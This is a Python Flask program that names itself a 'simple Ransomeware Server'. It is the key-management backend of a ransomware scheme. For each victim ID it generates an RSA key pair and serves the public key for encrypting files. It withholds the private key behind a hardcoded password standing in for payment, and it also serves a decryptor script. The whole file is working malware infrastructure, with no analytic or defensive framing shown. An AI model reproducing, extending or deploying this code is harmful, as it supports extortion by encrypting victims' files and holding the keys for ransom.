import os, random, sys, string
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import ctypes
import hashlib
import json
from time import time
from uuid import uuid4
from urlparse import urlparse
import requests
from flask import Flask, jsonify, request, send_file
import os.path
from os import path 

def generate_key_pair(id):
	private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
	public_key = private_key.public_key()
	
	private_key_pem = private_key.private_bytes(encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption())
	private_name = id + "_private_key.pem"
	with open(private_name, 'wb') as file:
		file.write(private_key_pem)

	public_key_pem = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)
	public_name = id + "_public_key.pem"
	with open(public_name, "wb") as f:
		f.write(public_key_pem)

	#now send public key name to caller 
	return public_name
#generate_key_pair(100)
app = Flask(__name__)

@app.route('/', methods=['GET'])
def root():
	return "This is a simple Ransomeware Server!\n" 

@app.route('/encrypt/<string:uuid>', methods=['GET'])
def send_public_key(uuid):
	name = uuid+"_public_key.pem"
	if(path.exists(name)):
		return send_file(name)
	else:
		name = generate_key_pair(uuid)
		return send_file(name)

@app.route('/decrypt/<string:uuid>/<string:password>', methods=['GET'])
def send_private_key(uuid, password):
	name = uuid+"_private_key.pem"
	if(path.exists(name)):
		#hardcoded password requirement
		if(password == "Password"):
			return send_file(name)
		else:
			#-1 indicated password was wrong 
			return str(-1)

	else:
		#-2 indicates key was deleted
		return str(-2)

@app.route('/decryptor', methods=['GET'])
def send_decryptor():
	if(path.exists('decrypt.py')):
		return send_file('decrypt.py')
	else:
		return str(-1)
if __name__ == '__main__':
	app.run(host='', port=5000)
